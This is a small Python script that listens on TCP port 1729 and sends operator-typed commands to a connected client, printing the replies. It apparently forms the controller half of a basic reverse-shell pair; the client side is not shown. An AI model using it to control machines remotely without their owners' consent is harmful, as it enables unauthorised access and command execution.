import socket
import sys

def createSocket():
    '''
    Create Sockets
    '''
    try:
        global host, port, s

        host = ""
        port = 1729
        s = socket.socket()
    
    except socket.error as err:
        print("Socker Creation Error: " + str(err))

def bind_socket():
    try:
        global host, port, s
        print("Binding Port: "+str(port))

        s.bind((host, port))
        s.listen(5)

    except socket.error as err:
        print("Socker Binding Error: " + str(err) +"\nRetrying...")
        bind_socket()

def socket_Accept():
    conn, add = s.accept()
    print("Connection has been made \n IP:" + add[0]+"\nPort:"+str(add[1]))

    sendCommand(conn)
    conn.close()

def sendCommand(conn):
    while True:
        cmd = input()
        if cmd == 'quit':
            conn.close()
            s.close()
            sys.exit()
        if len(str.encode(cmd)) > 0:
            conn.send(str.encode(cmd))
            clientRes = str(conn.recv(1024), "utf-8")
            print(clientRes)

if __name__ == "__main__":
    createSocket()
    bind_socket()
    socket_Accept()